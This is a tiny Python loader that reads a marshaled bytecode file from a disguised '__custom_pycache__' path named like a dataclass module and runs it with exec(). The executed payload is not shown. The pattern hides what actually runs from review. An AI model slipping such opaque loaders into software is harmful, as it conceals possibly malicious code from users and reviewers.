
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'dataclass_4db5606428304946b4ec57f7fd4e15e7.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
